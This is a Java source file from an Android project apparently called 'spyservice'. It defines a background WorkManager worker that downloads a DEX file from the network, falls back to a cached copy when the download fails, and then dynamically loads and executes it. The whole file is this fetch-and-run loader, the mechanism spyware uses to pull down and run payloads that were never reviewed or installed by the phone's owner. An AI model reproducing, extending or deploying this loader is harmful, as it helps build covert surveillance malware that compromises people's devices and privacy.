/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.WorkerParameters;

import java.io.File;

import ru.er_log.spyservice.loadable.DexLoader;
import ru.er_log.spyservice.network.DownloadManager;

public class Worker extends androidx.work.Worker
{
    private DexLoader dexLoader;

    public Worker(@NonNull Context context, @NonNull WorkerParameters workerParams)
    {
        super(context, workerParams);

        DownloadManager downloadManager = new DownloadManager();
        dexLoader = new DexLoader(context, downloadManager);
    }

    @NonNull
    @Override
    public Result doWork()
    {
        return doWork(dexLoader);
    }

    public static Result doWork(DexLoader dexLoader)
    {
        if (Settings.USE_LOCAL_DEX)
        {
            Log.d(Settings.LOG_TAG, "WARNING: USE_LOCAL_DEX settings is ON");
            //dexLoader.forceSetDEXLoader(new ru.er_log.spyservice.loadable.Loadable()); // Comment/Uncomment for release/debug.
        } else
        {
            if (!dexLoader.downloadDex(null))
            {
                Log.d(Settings.LOG_TAG, "Failure while downloading DEX file");
                File file = new File(dexLoader.getConstDexPath());
                if (file.isFile())
                {
                    Log.d(Settings.LOG_TAG, "Trying to load old DEX file...");
                    dexLoader.forceSetDEXFile(file);
                } else
                {
                    Log.d(Settings.LOG_TAG, "DEX not downloaded, can't continue...");
                    return Result.failure();
                }
            }

            try
            {
                dexLoader.loadDex();
            } catch (DexLoader.DEXNotFoundException e)
            {
                Log.d(Settings.LOG_TAG, "Can't load DEX: " + e.getMessage());
                return Result.failure();
            }
        }

        try
        {
            if (dexLoader.start())
                return Result.success();
            else
                return Result.retry();
        } catch (DexLoader.DEXNotLoadedException e)
        {
            Log.d(Settings.LOG_TAG, "Can't start DEX: " + e.getMessage());
            return Result.failure();
        }
    }
}
